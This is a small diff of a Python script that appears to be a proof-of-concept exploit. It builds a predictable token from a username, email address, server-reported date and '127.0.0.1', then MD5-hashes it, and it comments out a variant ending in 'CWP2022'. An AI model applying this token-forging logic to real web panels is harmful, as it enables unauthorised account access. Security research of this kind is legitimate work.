@@ -131,7 +131,7 @@ if __name__ == '__main__':
     print(f'  [-] Got Date {date_string} from response')
     # format the token
     token_string = f'{args.username}||{args.email_address}||{date_string}||127.0.0.1'
-    token_string = f'{args.username}||{args.email_address}||{date_string}||127.0.0.1||CWP2022'
+    #token_string = f'{args.username}||{args.email_address}||{date_string}||127.0.0.1||CWP2022'
 
     # hash the token with md5
 
